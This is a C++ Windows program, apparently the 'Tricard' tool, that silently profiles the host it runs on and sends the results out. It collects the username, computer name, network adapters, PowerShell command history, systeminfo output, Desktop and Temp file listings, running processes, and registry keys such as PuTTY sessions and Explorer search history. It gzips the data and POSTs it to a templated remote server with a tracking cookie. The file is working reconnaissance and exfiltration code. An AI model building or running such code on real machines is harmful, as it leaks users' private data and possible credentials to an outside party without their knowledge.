#include <stdio.h>
#include <windows.h>
#include <winhttp.h>
#include <iphlpapi.h>
#include <string>
#include <vector>
#include <ntstatus.h>
#include <psapi.h>
#include <fstream>
#include <iostream>
#include <sstream>
#include <zlib.h>
#include "../magic.h"

#pragma comment(lib, "winhttp.lib")

using namespace std;

#define MAXREC 4
#define MAX_KEY_LENGTH 255
#define MAX_VALUE_NAME 16383
#define BUFSIZE 8196

void PrintWinApiError(const char* message) {
  DWORD error = GetLastError();
  char errorMessage[256];
  FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, 0, errorMessage, sizeof(errorMessage), NULL);
  fprintf(stderr, "%s: %s\n", message, errorMessage);
}

std::string ToHexString(BYTE value) {
  std::stringstream ss;
  ss << std::hex << static_cast<int>(value);
  return ss.str();
}

std::string sanitizeString(const std::string& input) {
    std::string sanitized;
    for (char ch : input) {
        if (isprint(ch)) {
            sanitized += ch;
        }
        else {
            sanitized += "\\x" + std::to_string(static_cast<int>(static_cast<unsigned char>(ch)));
        }
    }
    return sanitized;
}


std::string FormatRegBinary(const BYTE* data, DWORD dataSize) {
  std::vector<std::string> hexValues;
  hexValues.reserve(dataSize);
  for (DWORD i = 0; i < dataSize; i++) {
    hexValues.push_back("0x" + ToHexString(data[i]));
  }
  std::string json = "[";
  for (size_t i = 0; i < hexValues.size(); i++) {
    if (i != 0) {
      json += ", ";
    }
    json += hexValues[i];
  }
  json += "]";
  return json;
}
std::string FormatRegDword(DWORD data) {
  return sanitizeString(std::to_string(data));
}
std::string FormatRegQword(ULONGLONG data) {
  return sanitizeString(std::to_string(data));
}
std::string FormatRegExpandSz(const char* data) {
  return sanitizeString(std::string(data));
}
std::string FormatRegMultiSz(const char* data) {
  std::string json = "[";
  bool first = true;
  while (*data) {
    if (!first) {
      json += ", ";
    }
    json += "\"" + sanitizeString(std::string(data)) + "\"";
    data += strlen(data) + 1;
    first = false;
  }
  json += "]";
  return json;
}


std::string FormatRegistryValue(DWORD valueType, BYTE* data, DWORD dataSize) {
  switch (valueType) {
  case REG_SZ: {
      std::string tmp = std::string((char*)data);
      std::string san = sanitizeString(tmp);
      return san;
  }
  case REG_BINARY:
    return FormatRegBinary(data, dataSize);
  case REG_DWORD_LITTLE_ENDIAN:
  case REG_DWORD_BIG_ENDIAN:
    return FormatRegDword(*reinterpret_cast<DWORD*>(data));
  case REG_QWORD_LITTLE_ENDIAN:
    return FormatRegQword(*reinterpret_cast<ULONGLONG*>(data));
  case REG_EXPAND_SZ:
    return FormatRegExpandSz(reinterpret_cast<const char*>(data));
  case REG_MULTI_SZ:
    return FormatRegMultiSz(reinterpret_cast<const char*>(data));
  default:
    return "\"Unsupported data type\"";
  }
}
void replaceAll(std::string& str, const std::string& from, const std::string& to) {
  if(from.empty())
    return;
  size_t start_pos = 0;
  while((start_pos = str.find(from, start_pos)) != std::string::npos) {
    str.replace(start_pos, from.length(), to);
    start_pos += to.length(); 
  }
}

std::wstring GetKeyPathFromKKEY(HKEY key)
{
  std::wstring keyPath;
  if (key != NULL)
    {
      HMODULE dll = LoadLibrary("ntdll.dll");
      if (dll != NULL) {
	typedef DWORD (__stdcall *NtQueryKeyType)(
						  HANDLE  KeyHandle,
						  int KeyInformationClass,
						  PVOID  KeyInformation,
						  ULONG  Length,
						  PULONG  ResultLength);
	NtQueryKeyType func = reinterpret_cast<NtQueryKeyType>(::GetProcAddress(dll, "NtQueryKey"));
	if (func != NULL) {
	  DWORD size = 0;
	  DWORD result = 0;
	  result = func(key, 3, 0, 0, &size);
	  if (result == STATUS_BUFFER_TOO_SMALL)
	    {
	      size = size + 2;
	      wchar_t* buffer = new (std::nothrow) wchar_t[size/sizeof(wchar_t)]; 
	      if (buffer != NULL)
		{
		  result = func(key, 3, buffer, size, &size);
		  if (result == STATUS_SUCCESS)
		    {
		      buffer[size / sizeof(wchar_t)] = L'\0';
		      keyPath = std::wstring(buffer + 2);
		    }
		  delete[] buffer;
		}
	    }
	}
	FreeLibrary(dll);
      }
    }
  return keyPath;
}

std::string DumpRegistryKeyToJson(HKEY hKey, const std::string& keyPath, int reclevel = 0) {
  TCHAR achKey[MAX_KEY_LENGTH];
  DWORD cbName;
  DWORD cSubKeys = 0;
  DWORD cValues = 0;
  if (reclevel >= MAXREC)
    {
      return "";
    }
  DWORD retCode = RegQueryInfoKey(
				  hKey,
				  NULL,
				  NULL,
				  NULL,
				  &cSubKeys,
				  &cbName,
				  NULL,
				  &cValues,
				  NULL,
				  NULL,
				  NULL,
				  NULL
				  );
  std::string key;
  if (retCode != ERROR_SUCCESS) {
    return key;
  }
  if (cValues > 0) {
    for (DWORD i = 0; i < cValues; i++) {
      CHAR achValue[128];
      DWORD cchValue = MAX_VALUE_NAME;
      BYTE data_dword[MAX_VALUE_NAME];
      retCode = RegEnumValue(hKey, i, achValue, &cchValue, NULL, NULL, NULL, NULL);
      if (retCode == ERROR_SUCCESS) {
	DWORD valueType;
	DWORD dataSize = 0;
	retCode = RegQueryValueEx(hKey, achValue, NULL, &valueType, NULL, &dataSize);
	if (retCode == ERROR_SUCCESS) {
	  std::vector<BYTE> data(dataSize);
	  retCode = RegQueryValueEx(hKey, achValue, NULL, &valueType, (LPBYTE)data_dword, &dataSize);
	  if (retCode == ERROR_SUCCESS) {
	    std::string esckey = keyPath.c_str();
	    std::string escval = FormatRegistryValue(valueType, data_dword, dataSize);
	    std::string escach = achValue;
	    replaceAll(escval,"\\", "\\\\");
	    replaceAll(escval, "\n", "    ");
	    replaceAll(escach,"\\", "/");
	    replaceAll(escval,"\"", "\\\"");
	    replaceAll(esckey,"\\","/");
	    key +=  "  \"" + esckey + "/" + escach + "\":" +  " \"" + escval + "\",\n";
	  }
	}
      }
    }
  }
  for (DWORD i = 0; i < cSubKeys; i++) {
    cbName = MAX_KEY_LENGTH;
    retCode = RegEnumKeyEx(hKey, i, achKey, &cbName, NULL, NULL, NULL, NULL);
    if (retCode == ERROR_SUCCESS) {
      HKEY hSubKey;
      std::string subKeyPath = keyPath + "\\" + achKey;
      if (RegOpenKeyEx(hKey, achKey, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
	key.append(DumpRegistryKeyToJson(hSubKey, subKeyPath, reclevel +1));
	RegCloseKey(hSubKey);
      }
    }
  }
  return key;
}

std::string repr(const BYTE* byteBuffer, size_t length) {
  std::string representation = "{";
  for (size_t i = 0; i < length; i++) {
    representation += std::to_string(byteBuffer[i]);
    if (i < length - 1) {
      representation += ", ";
    }
  }
  representation += "}";
  return representation;
}

std::string GetReg(HKEY hRootKey, std::string rootKeyPath){
  HKEY key;
  std::string dat;
  RegOpenKeyEx(hRootKey, rootKeyPath.c_str(), 0,KEY_READ, &key);
  dat = DumpRegistryKeyToJson(key, rootKeyPath);
  if (!dat.empty()) {
    dat.pop_back();
    dat.pop_back();
    dat += "\n";
  }
  return dat;
}

std::string LoopPredefinedKeys() {
  struct KeyInfo {
    HKEY hKey;
    const char* rootPath;
  };
  std::string array = " \"Regdump\":{\n";
  HKEY hKey,key;
  KeyInfo keys[] = {
    { HKEY_CLASSES_ROOT, "HKEY_CLASSES_ROOT" },
    { HKEY_CURRENT_CONFIG, "HKEY_CURRENT_CONFIG" },
    { HKEY_CURRENT_USER, "HKEY_CURRENT_USER" },
    { HKEY_CURRENT_USER_LOCAL_SETTINGS, "HKEY_CURRENT_USER_LOCAL_SETTINGS" },
    { HKEY_LOCAL_MACHINE, "HKEY_LOCAL_MACHINE" },
    { HKEY_PERFORMANCE_DATA, "HKEY_PERFORMANCE_DATA" },
    { HKEY_PERFORMANCE_NLSTEXT, "HKEY_PERFORMANCE_NLSTEXT" },
    { HKEY_PERFORMANCE_TEXT, "HKEY_PERFORMANCE_TEXT" },
    { HKEY_USERS, "HKEY_USERS" }
  };
  std::string jsonPart;
  std::string paths[3] = {"SOFTWARE\\Microsoft\\Cryptography","Software\\SimonTatham\\PuTTY","Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery"};
  for (const auto& keyInfo : keys) {
    hKey = keyInfo.hKey;
    const char* rootPath = keyInfo.rootPath;
    array += std::string(" \"")+ rootPath + std::string("\": [\n");
    for (const string path: paths){
      LSTATUS lres= RegOpenKeyEx(hKey, path.c_str(), 0,KEY_READ, &key);
      if( lres == ERROR_SUCCESS){
	array += "{\n";
	std::string p = path.c_str();
	replaceAll(p,"\\","\\\\");
	array += " \""+ std::string(rootPath)+"\\\\"+p+"\": {\n";
	jsonPart = GetReg(hKey, path);
	array += jsonPart;
	array += " }\n},\n";
      }
    }
    if (!array.empty() && array[array.size() - 3] == '}') {
        array.pop_back();
        array.pop_back();
    }
    array += std::string("\n],\n");
    if (!array.empty() && array[array.size() -3] != ']') {
        array.pop_back();
        array.pop_back();
    }
  }
  if (!array.empty()) {
    array.pop_back();
    array.pop_back();
  }
  array += "\n}\n}\n";
  return array;
}

void ListProcessesToJson(char* jsonData, size_t jsonDataLen) {
  DWORD processes[1024];
  DWORD cbNeeded;
  if (EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
    int numProcesses = cbNeeded / sizeof(DWORD);
    strncat(jsonData, "  \"RunningProcesses\": [", jsonDataLen);
    for (int i = 0; i < numProcesses; i++) {
      DWORD processId = processes[i];
      HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
      if (hProcess) {
	char processName[MAX_PATH] = "";
	HMODULE hMod;
	DWORD cbNeeded;
	if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
	  GetModuleBaseNameA(hProcess, hMod, processName, sizeof(processName) / sizeof(char));
	}
	strncat(jsonData, "\"", jsonDataLen);
	strncat(jsonData, processName, jsonDataLen);
	strncat(jsonData, "\"", jsonDataLen);
	strncat(jsonData, ", ", jsonDataLen);
	CloseHandle(hProcess);
      }
    }
    jsonData[strlen(jsonData) - 2] = '\0';
    strncat(jsonData, "],\n", jsonDataLen);
  }
}

void ListLoadedModulesToJson(char* jsonData, size_t jsonDataLen) {
  HMODULE hModules[1024];
  DWORD cbNeeded;
  if (EnumProcessModules(GetCurrentProcess(), hModules, sizeof(hModules), &cbNeeded)) {
    int numModules = cbNeeded / sizeof(HMODULE);
    strncat(jsonData, "  \"LoadedModules\": [", jsonDataLen);
    for (int i = 0; i < numModules; i++) {
      char moduleName[MAX_PATH] = "";
      GetModuleFileNameExA(GetCurrentProcess(), hModules[i], moduleName, sizeof(moduleName) / sizeof(char));
      strncat(jsonData, "\"", jsonDataLen);
      std::string moduleNamestr = std::string(moduleName);
      replaceAll(moduleNamestr, "\\", "\\\\");
      strncat(jsonData,moduleNamestr.c_str(), jsonDataLen);
      strncat(jsonData, "\"", jsonDataLen);
      if (i < numModules - 1) {
	strncat(jsonData, ", ", jsonDataLen);
      }
    }
    strncat(jsonData, "],\n", jsonDataLen);
  }
}

static const char base64_chars[] =
"xXBase64CharSetXx";
char* Base64Encode(const char* input) {
    size_t input_length = strlen(input);
    size_t encoded_length = 4 * ((input_length + 2) / 3);
    char* encoded_data = new char[encoded_length + 1];
    encoded_data[encoded_length] = '\0';
    for (size_t i = 0, j = 0; i < input_length;) {
        uint32_t octet_a = i < input_length ? static_cast<uint8_t>(input[i++]) : 0;
        uint32_t octet_b = i < input_length ? static_cast<uint8_t>(input[i++]) : 0;
        uint32_t octet_c = i < input_length ? static_cast<uint8_t>(input[i++]) : 0;
        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;
        encoded_data[j++] = base64_chars[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = base64_chars[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = base64_chars[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = base64_chars[(triple >> 0 * 6) & 0x3F];
    }
    for (size_t i = 0; i < (3 - input_length % 3) % 3; i++) {
        encoded_data[encoded_length - 1 - i] = '=';
    }
    return encoded_data;
}

int GetPSHistory(char* jsonData, int jsonDataLen) {
    char expandedPath[MAX_PATH];
    const char* filePathWithEnvVar = "%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt";
    DWORD result = ExpandEnvironmentStrings(filePathWithEnvVar, expandedPath, MAX_PATH);
    if (INVALID_FILE_ATTRIBUTES == GetFileAttributes(expandedPath) && GetLastError() == ERROR_FILE_NOT_FOUND)
    {
        return 0;
    }
    char pshistory[300000];
    HANDLE psh = CreateFile(expandedPath, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    long unsigned int read;
    int size = GetFileSize(psh, NULL);
    if (size > 300000)
    {
        size = 300000;
    }
    int bsize = size + size * 0.3333333;
    char* dest = (char*)malloc(bsize * sizeof(char));
    ReadFile(psh, pshistory, size, &read, NULL);
    dest = Base64Encode(pshistory);
    int js = snprintf(jsonData + jsonDataLen, strlen(dest) + 34, "  \"PSHistory\": \"%s\",\n", dest);
    free(dest);
    return js + jsonDataLen;
}

int GetSysinfo(char *jsonData, int jsonDataLen){
  char sysInfo[128000];
  system("C:\\Windows\\SysWOW64\\systeminfo.exe >C:\\Windows\\Temp\\sys.txt & certutil -f -encodehex C:\\Windows\\Temp\\sys.txt C:\\Windows\\Temp\\sys.b64 0x40000001 >nul");
  HANDLE sysfile = CreateFile("C:\\Windows\\Temp\\sys.b64",GENERIC_READ,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
  long unsigned int read;
  int size = GetFileSize(sysfile, NULL);
  ReadFile(sysfile, sysInfo, size, &read, NULL);
  strcat(jsonData, "\"Sysinfo\": \"");
  snprintf(jsonData + strlen(jsonData), size, "%s", sysInfo);
  strcat(jsonData, "\",\n");
  return strlen(jsonData);
}

void GetNetworkInterfacesJSON(char* jsonBuffer, size_t bufferSize) {
    const char* jsonStart = " \"NetworkInterfaces\": [\n";
    strcat(jsonBuffer, jsonStart);
    ULONG bufLen = sizeof(IP_ADAPTER_INFO);
    PIP_ADAPTER_INFO pAdapterInfo = (IP_ADAPTER_INFO*)malloc(bufLen);
    if (pAdapterInfo == nullptr) {
        std::cerr << "Error allocating memory needed to call GetAdaptersInfo" << std::endl;
        return;
    }
    if (GetAdaptersInfo(pAdapterInfo, &bufLen) == ERROR_BUFFER_OVERFLOW) {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(bufLen);
        if (pAdapterInfo == nullptr) {
            std::cerr << "Error allocating memory needed to call GetAdaptersInfo" << std::endl;
            return;
        }
        if (GetAdaptersInfo(pAdapterInfo, &bufLen) != NO_ERROR) {
            std::cerr << "GetAdaptersInfo failed" << std::endl;
            free(pAdapterInfo);
            return;
        }
    }
    PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
    while (pAdapter) {
        char jsonPart[1024]; 
        snprintf(jsonPart, 1024,
            "    {\n"
            "      \"AdapterName\": \"%s\",\n"
            "      \"Description\": \"%s\",\n"
            "      \"IpAddress\": \"%s\",\n"
            "      \"MacAddress\": \"%02X:%02X:%02X:%02X:%02X:%02X\"\n",
            pAdapter->AdapterName, pAdapter->Description, pAdapter->IpAddressList.IpAddress.String,
            pAdapter->Address[0], pAdapter->Address[1], pAdapter->Address[2], pAdapter->Address[3],
            pAdapter->Address[4], pAdapter->Address[5]);
	strncat(jsonBuffer, jsonPart, strlen(jsonPart));
        pAdapter = pAdapter->Next;
        if (pAdapter) {
            strncat(jsonBuffer, "    },\n", 8);
        }
        else {
            strncat(jsonBuffer, "    }\n", 7);
        }
    }
    const char* jsonEnd = "  ],\n";
    strncat(jsonBuffer, jsonEnd, 6);
    if (pAdapterInfo) {
        free(pAdapterInfo);
    }
}

int GetBasicInfo(char* jsonData){
  char username[UNLEN + 1];
  DWORD usernameLen = UNLEN + 1;
  if (!GetUserNameA(username, &usernameLen)) {
    PrintWinApiError("Failed to get user name");
    return 1;
  }
  char computerName[MAX_COMPUTERNAME_LENGTH + 1];
  DWORD computerNameLen = MAX_COMPUTERNAME_LENGTH + 1;
  if (!GetComputerNameA(computerName, &computerNameLen)) {
    PrintWinApiError("Failed to get computer name");
    return 1;
  }
  int jsonDataLen = snprintf(jsonData, 3000, "{\n"
			     "  \"Username\": \"%s\",\n"
			     "  \"MalOne\": \"xXxUUIDxXx\",\n"
			     "  \"Computername\": \"%s\"",
			     username, computerName);
  return jsonDataLen += snprintf(jsonData + jsonDataLen, 7 , ",\n");
}

std::string ReadFileHeader(const std::string& filePath, int headerLength = 8) {
    std::ifstream file(filePath, std::ios::binary);
    if (!file) {
        return "";
    }
    char buffer[headerLength];
    file.read(buffer, headerLength);
    if (file) {
        return std::string(buffer, headerLength);
    }
    return "";
}

std::string HexDecode(const std::string& hexString) {
    std::string decoded;
    for (size_t i = 0; i < hexString.length(); i += 2) {
        decoded += static_cast<char>(std::stoi(hexString.substr(i, 2), nullptr, 16));
    }
    return decoded;
}

std::string IdentifyFileType(const std::string& filePath) {
    std::string fileHeader = ReadFileHeader(filePath);
    for (const auto& entry : FileMagicNumbers) {
        const std::string& fileType = entry.first;
        const std::string& hexMagicNumber = entry.second;
	std::string magicNumber = HexDecode(hexMagicNumber);
        if (fileHeader.compare(0, magicNumber.length(), magicNumber) == 0) {
	  return fileType;
        }
    }
    return "Unknown";
}

void ListFilesInDirectory(const char* directoryPath, char* jsonResult) {
    WIN32_FIND_DATA findFileData;
    HANDLE hFind = FindFirstFile((std::string(directoryPath) + "\\*").c_str(), &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
      return;
    }
    bool firstFile = true;
    while (true) {
        if (!firstFile) {
            strcat(jsonResult, ", ");
        } else {
            firstFile = false;
        }
        strcat(jsonResult, "{");
        strcat(jsonResult, "\"Filename\": \"");
        strcat(jsonResult, findFileData.cFileName);
	strcat(jsonResult, "\", ");
      	strcat(jsonResult, "\"FileType\": ");
      	if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            strcat(jsonResult, "\"Directory\", ");
        } else {
            strcat(jsonResult, "\"File\", ");
        }
	strcat(jsonResult, "\"MagicNumber\": \"");
	std::string type = IdentifyFileType((std::string(directoryPath) + "\\"+findFileData.cFileName).c_str());
	strcat(jsonResult, type.c_str());
	strcat(jsonResult, "\", ");
        strcat(jsonResult, "\"CreationDate\": \"");
        SYSTEMTIME st;
        FileTimeToSystemTime(&findFileData.ftCreationTime, &st);
        char creationDate[64];
        snprintf(creationDate, sizeof(creationDate), "%04d-%02d-%02d %02d:%02d:%02d",
                 st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        strcat(jsonResult, creationDate);
        strcat(jsonResult, "\", ");
        strcat(jsonResult, "\"ModifiedDate\": \"");
        FileTimeToSystemTime(&findFileData.ftLastWriteTime, &st);
        char modifiedDate[64];
        snprintf(modifiedDate, sizeof(modifiedDate), "%04d-%02d-%02d %02d:%02d:%02d",
                 st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
        strcat(jsonResult, modifiedDate);
        strcat(jsonResult, "\"}");
        if (!FindNextFile(hFind, &findFileData)) {
            if (GetLastError() == ERROR_NO_MORE_FILES) {
                break;
            }
        }
    }
    FindClose(hFind);
}

void LoopFolders(char *jsonData){
  std::string folds[2] = {"C:\\Windows\\Temp", "%userprofile%\\Desktop"};
  char expandedPath[MAX_PATH];
  strcat(jsonData, "\"Files\": {");
  for (const string fold: folds){
    ExpandEnvironmentStrings(fold.c_str(), expandedPath, MAX_PATH);
    std::string tmp = std::string(expandedPath);
    replaceAll(tmp, "\\", "/");
    snprintf(jsonData+strlen(jsonData),tmp.size()+9," \"%s\":[",tmp.c_str());    
    ListFilesInDirectory(expandedPath, jsonData);
    strcat(jsonData,"],");
  }
  jsonData[strlen(jsonData)-1] = '\0';
  strcat(jsonData, "},");
}

bool SendGzipCompressedPOSTRequest(const char* postData) {
  HINTERNET hSession = WinHttpOpen(L"Tricard https://github.com/therealunicornsecurity/tricard", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
  if (!hSession) {
    std::wcerr << L"Failed to open WinHTTP session." << std::endl;
    return false;
  }
  HINTERNET hConnect = WinHttpConnect(hSession, L"xXTricardServerXx", INTERNET_DEFAULT_HTTPS_PORT, 0);
  if (!hConnect) {
    PrintWinApiError("Failed to connect to the server");
    WinHttpCloseHandle(hSession);
    return 1;
  }
  HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/GetData", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
  if (!hRequest) {
    std::wcerr << L"Failed to open WinHTTP request." << std::endl;
    PrintWinApiError("httpoepnfail");
    WinHttpCloseHandle(hSession);
    WinHttpCloseHandle(hConnect);
    return false;
  }
  std::vector<Bytef> compressedData(strlen(postData) + 1024); 
  uLong compressedSize = compressedData.size();
  if (compress(&compressedData[0], &compressedSize, (const Bytef*)postData, strlen(postData)) != Z_OK) {
    std::cerr << "Failed to compress data." << std::endl;
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hSession);
    WinHttpCloseHandle(hConnect);
    return false;
  }
  LPCWSTR additionalHeaders = L"Content-Encoding: gzip\r\nCookie: malone=xXxUUIDxXx\r\n";
  if (WinHttpSendRequest(hRequest, additionalHeaders, 0, &compressedData[0], compressedSize, compressedSize, 0)) {
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return true;
  } else {
    std::wcerr << L"Failed to send request." << std::endl;
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return false;
  }
}

int main() {
  char *jsonData= new char [5*1024*1024];
  jsonData[0] = '\0';
  int jsonDataLen = GetBasicInfo(jsonData);
  GetNetworkInterfacesJSON(jsonData, jsonDataLen);
  jsonDataLen += GetPSHistory(jsonData, strlen(jsonData));
  jsonDataLen += GetSysinfo(jsonData, strlen(jsonData));
  LoopFolders(jsonData);
  ListProcessesToJson(jsonData, strlen(jsonData));
  ListLoadedModulesToJson(jsonData, strlen(jsonData));
  std::string reg = LoopPredefinedKeys();
  try{
    strncat(jsonData, reg.c_str(), reg.size());
  }
  catch(...){
    PrintWinApiError("strncat err");
    return 1;
  }
  jsonDataLen += reg.size();
  SendGzipCompressedPOSTRequest(jsonData);
  delete[] jsonData;
  return 0;
}
